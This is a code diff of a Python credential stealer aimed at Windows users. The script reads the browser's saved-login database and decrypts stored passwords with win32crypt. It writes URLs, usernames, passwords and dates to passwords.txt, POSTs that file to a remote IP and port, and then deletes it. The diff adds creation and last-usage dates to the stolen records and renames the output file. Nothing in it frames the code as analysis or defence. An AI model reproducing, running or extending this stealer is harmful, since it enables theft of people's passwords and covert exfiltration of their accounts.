@@ -11,9 +11,9 @@ import sys
 
 
 def delete_file():
-    #os.remove("notes.txt")
     try:
         os.remove(file)
+        #os.remove("passwords.txt")
     except:
         pass
 
@@ -30,7 +30,7 @@ except:
 
 def send():
     try:
-        with open("notes.txt", "r") as f:
+        with open("passwords.txt", "r") as f:
             payload = json.dumps({"content": f.read()})
             requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
         delete_file()
@@ -60,10 +60,11 @@ def load_path(id):
 
 
 def store_data(data):
-    with open("notes.txt", 'a') as f:
-        f.write("##########################################")
+    with open("passwords.txt", 'a') as f:
+        f.write("\n##########################################")
         f.write(data)
         f.write("##########################################")
+        #f.write(f"\n################=Encryption-Key=################\n{fetch_key()}")
 
 
 def fetch_key():
@@ -96,7 +97,8 @@ def decrypt_password(password, key):
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            return "No Passwords Found"
+            return "Password could not be decrypted"
+
 
 try:
     db_path = os.path.join(os.environ["USERPROFILE"], load_path("db"))
@@ -115,13 +117,13 @@ cursor.execute("select origin_url, action_url, username_value, password_value, d
 
 for row in cursor.fetchall():
     main_url = row[0]
-    login_page_url = row[1]
-    user_name = row[2]
-    date_of_creation = row[4]
-    last_usuage = row[5]
+    login_url = row[1]
+    username = row[2]
+    date_created = row[4]
+    last_usage = row[5]
 
-    if user_name or decrypt_password(row[3], fetch_key()):
-        data = f"\nAction URL:    {main_url}\nLogin URL:    {login_page_url}\nUsername:    {user_name}\nPassword:    {decrypt_password(row[3], fetch_key())}\n"
+    if username or decrypt_password(row[3], fetch_key()):
+        data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key())}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
         store_data(data)
     else:
         continue
